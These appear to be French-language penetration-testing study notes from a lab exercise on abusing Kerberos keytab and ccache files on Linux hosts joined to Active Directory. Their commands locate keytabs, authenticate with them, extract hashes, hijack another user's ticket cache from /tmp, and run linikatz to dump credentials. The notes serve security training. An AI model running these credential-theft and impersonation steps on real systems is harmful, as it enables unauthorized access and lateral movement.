Méthodes variés par distribution. généralement un fichier ccache dans `/tmp`, l'emplacement est dans la variable d'environement `KRB5CCNAME`.

Peut être un fichier keytab. Contient une paire de clefs Kerberos principales et encryptés (dérivé du mot de passe Keberos).

## Outils d'intégration avec AD
* realm
* sssd
* winbind
### détection
```shell-session
realm list
ps -ef | grep -i "winbind\|sssd"
```

## Trouver fichiers keytab
Peut utiliser l'extention .keytab, mais pas toujours.
```shell
find / -name *keytab* -ls 2>/dev/null
find / -name *.kt* -ls 2>/dev/null
```
Regarder aussi les cronjob
```
crontab -l
ls -lha /etc/cron.*
```

## Abuser fichiers Keytab
``` shell
#Lister les keytab
klist -k -t
#S'autentifier avec le keytab
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```
Extraire informations et hash des keytab
```shell
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

## Abuser fichiers ccache Keytab
chercher les fichiers dans /tmp, doit avoir le droit de lecture.
```
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB
```
On peut aussi l'installer localement. 
* Il faut pouvoir résoudre le nom du DC et domaines.
* Donner notre ticket à `KRB5CCNAME`
* Certaines applications comme evil-winrm vont nécessité un outil de gestion d'AD
```shell
sudo apt-get install krb5-user -y
#Donner le nom de domaine et du DC lors de l'instllation.
#Si déjà installé, modifier /etc/krb5.conf
```

## Divers
Convertir Ccache en kirbi
```shell-session
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

Linikatz pour extraire divers creds d'une intégration AD sous Linux
`./linikatz.sh`


